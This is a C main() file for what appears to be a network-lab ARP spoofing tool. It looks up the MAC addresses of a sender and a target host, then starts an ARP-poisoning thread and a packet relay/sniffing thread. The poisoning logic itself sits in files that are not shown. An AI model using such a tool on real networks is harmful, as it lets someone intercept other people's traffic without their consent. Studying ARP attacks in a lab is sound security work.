#include "common.h"
#include "use_pcap.h"
#include "use_socket.h"
#include "build.h"

int main(int argc, char *argv[])
{
    pcap_arg arg;
    struct arp_header ahdr_s, ahdr_t;
    struct thread_arg_arp t_arg_arp = {
        &arg, &ahdr_s, argv[3], 0, thread_arp_poison
    };
    struct thread_arg_relay t_arg_relay = {
        &arg, &ahdr_s, &ahdr_t, 0, thread_icmp_sniffing
    };

    if (argc < 4)
    {
        pr_err("Usage : %s <interface> <sender ip> <target ip>",
               argv[0]);
        exit(EXIT_FAILURE);
    }

    if (init_handle(&arg, argv[1]))
    {
        exit(EXIT_FAILURE);
    }

    // set arp || icmp
    if (set_handle_arp(&arg))
    {
        exit(EXIT_FAILURE);
    }

    if (get_local_addr(&arg, argv[1]))
    {
        exit(EXIT_FAILURE);
    }

    // send arp request to sender
    if (send_arp_request(&arg, argv[2], SENDER))
    {
        exit(EXIT_FAILURE);
    }

    // recv sender's information
    if (recv_arp_packet(&arg, &ahdr_s, SENDER))
    {
        exit(EXIT_FAILURE);
    }

    // send arp request to target
    if (send_arp_request(&arg, argv[3], TARGET))
    {
        exit(EXIT_FAILURE);
    }

    // recv target's information
    if (recv_arp_packet(&arg, &ahdr_t, TARGET))
    {
        exit(EXIT_FAILURE);
    }

    if (pthread_create(&t_arg_arp.tid, NULL, t_arg_arp.func, (void *)&t_arg_arp))
    {
        pr_err("Fail: pthread_create");
        exit(EXIT_FAILURE);
    }
    pr_out("pthread_create: tid = %lu", t_arg_arp.tid);

    if (pthread_create(&t_arg_relay.tid, NULL, t_arg_relay.func, (void *)&t_arg_relay))
    {
        pr_err("Fail: pthread_create");
        exit(EXIT_FAILURE);
    }
    pr_out("pthread_create: tid = %lu", t_arg_relay.tid);

    while (1)
        pause();

    if (close_handle(&arg))
    {
        exit(EXIT_FAILURE);
    }

    return 0;
}

